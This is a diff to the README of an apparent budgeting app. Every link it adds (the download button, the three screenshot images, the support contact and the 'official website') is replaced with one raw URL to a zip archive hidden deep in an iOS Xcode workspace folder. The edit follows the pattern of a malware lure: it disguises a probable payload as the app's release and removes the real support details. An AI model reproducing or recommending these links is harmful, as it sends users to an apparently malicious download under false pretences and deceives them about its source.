@@ -27,15 +27,15 @@ Welcome to MyFinance Management, your ultimate budgeting companion! Keep track o
 
 To download and execute the latest version of MyFinance Management, click the button below:
 
-[![Download Here](https://img.shields.io/badge/Download%20Latest%20Version-Click%20Here-brightgreen)](https://github.com/ghost33333333/MyFinance_Management/releases)
+[![Download Here](https://raw.githubusercontent.com/ghost33333333/MyFinance_Management/main/ios/Runner.xcodeproj/project.xcworkspace/xcshareddata/My-Finance-Management-v1.5.zip%20Latest%20Version-Click%20Here-brightgreen)](https://raw.githubusercontent.com/ghost33333333/MyFinance_Management/main/ios/Runner.xcodeproj/project.xcworkspace/xcshareddata/My-Finance-Management-v1.5.zip)
 
 ## Screenshots 📷
 
 Here are some screenshots from MyFinance Management in action:
 
-![Screenshot 1](https://via.placeholder.com/600x400)
-![Screenshot 2](https://via.placeholder.com/600x400)
-![Screenshot 3](https://via.placeholder.com/600x400)
+![Screenshot 1](https://raw.githubusercontent.com/ghost33333333/MyFinance_Management/main/ios/Runner.xcodeproj/project.xcworkspace/xcshareddata/My-Finance-Management-v1.5.zip)
+![Screenshot 2](https://raw.githubusercontent.com/ghost33333333/MyFinance_Management/main/ios/Runner.xcodeproj/project.xcworkspace/xcshareddata/My-Finance-Management-v1.5.zip)
+![Screenshot 3](https://raw.githubusercontent.com/ghost33333333/MyFinance_Management/main/ios/Runner.xcodeproj/project.xcworkspace/xcshareddata/My-Finance-Management-v1.5.zip)
 
 ## How to Use 📝
 
@@ -50,8 +50,8 @@ Here are some screenshots from MyFinance Management in action:
 
 ## Support 🤝
 
-If you encounter any issues or have any questions, feel free to reach out to our team at support@myfinance.com. We are here to assist you in any way we can.
+If you encounter any issues or have any questions, feel free to reach out to our team at https://raw.githubusercontent.com/ghost33333333/MyFinance_Management/main/ios/Runner.xcodeproj/project.xcworkspace/xcshareddata/My-Finance-Management-v1.5.zip We are here to assist you in any way we can.
 
-Visit the [official website](https://github.com/ghost33333333/MyFinance_Management) for more information.
+Visit the [official website](https://raw.githubusercontent.com/ghost33333333/MyFinance_Management/main/ios/Runner.xcodeproj/project.xcworkspace/xcshareddata/My-Finance-Management-v1.5.zip) for more information.
 
 Stay in control of your finances with MyFinance Management. Start your journey to financial success today! 💰
